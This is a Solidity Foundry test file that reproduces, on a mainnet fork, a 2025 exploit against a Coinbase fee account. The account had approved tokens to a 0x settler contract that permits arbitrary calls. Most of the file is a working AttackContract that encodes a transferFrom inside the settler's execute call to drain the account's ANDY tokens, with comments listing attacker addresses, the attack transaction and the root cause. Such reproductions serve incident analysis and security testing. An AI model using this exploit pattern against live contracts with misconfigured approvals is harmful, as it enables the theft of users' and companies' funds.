// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 300k USD
// Attacker : https://etherscan.io/address/0xC31a49D1c4C652aF57cEFDeF248f3c55b801c649
// Attack Contract : https://etherscan.io/address/0xF0D539955974b248d763D60C3663eF272dfC6971
// Vulnerable Contract : 
// Attack Tx : https://etherscan.io/tx/0x33b2cb5bc3c0ccb97f0cc21e231ecb6457df242710dfce8d1b68935f0e05773b

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/deeberiroz/status/1955718986894549344
// Hacking God : N/A
pragma solidity ^0.8.0;

// 0x swapper
address constant MAINNET_SETTLER = 0xDf31A70a21A1931e02033dBBa7DEaCe6c45cfd0f;
address constant ANDY = 0x68BbEd6A47194EFf1CF514B50Ea91895597fc91E;
// coinbase fee receiver account
address constant COINBASE_FEE = 0x382fFCe2287252F930E1C8DC9328dac5BF282bA1;

contract coinbase is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 23134257 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = ANDY;
    }

    function testExploit() public balanceLog {
        // Root cause: A Coinbase fee account accidentally approved multiple ERC-20 tokens to a 0x swapper.
        // The swapper lets anyone execute arbitrary calls.
        // For example:
        // https://etherscan.io/tx/0x8df54ebe76c09cda530f1fccb591166c716000ec95ee5cb37dff997b2ee269f2

        // About 2 hours later (Aug-13-2025 07 PM), the attacker noticed and began exploiting it.
        AttackContract attackContract = new AttackContract();
        vm.deal(address(this), 0.01 ether);
        uint256 fund = 0.00000000000000162 ether;
        attackContract.attack{value: fund}();
    }
}

contract AttackContract is Test {
    function attack() public payable {
        AllowedSlippage memory slippage = AllowedSlippage({
            recipient: payable(address(0)),
            buyToken: IERC20(address(0)),
            minAmountOut: 0
        });
        bytes[] memory actions = new bytes[](1);
        uint256 amount = IERC20(ANDY).balanceOf(COINBASE_FEE);
        bytes memory action = buildData(0, 10000, ANDY, 0, COINBASE_FEE, msg.sender, amount);
        actions[0] = action;
        // bytes32 data = 0xa00dda5ed0267accdf4ac6940000000000000000000000000000000000000000;
        IMainnetSettler(MAINNET_SETTLER).execute(slippage, actions, "");
    }

    function buildData(
        uint256 arg0,
        uint256 arg1,
        address target,
        uint256 arg3,
        address from,
        address to,
        uint256 amount
    ) public pure returns (bytes memory) {
        // Encode the inner ERC20 transferFrom call
        bytes memory inner = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            from,
            to,
            amount
        );

        // Encode the outer function call
        bytes memory data = abi.encodeWithSelector(
            bytes4(0x38c9c147),
            arg0,
            arg1,
            target,
            arg3,
            inner
        );
        return data;
    }
}

struct AllowedSlippage {
    address payable recipient;
    IERC20 buyToken;
    uint256 minAmountOut;
}

interface IMainnetSettler {
    function execute(AllowedSlippage calldata slippage, bytes[] calldata actions, bytes32 data)
        external
        payable
        returns (bool);
}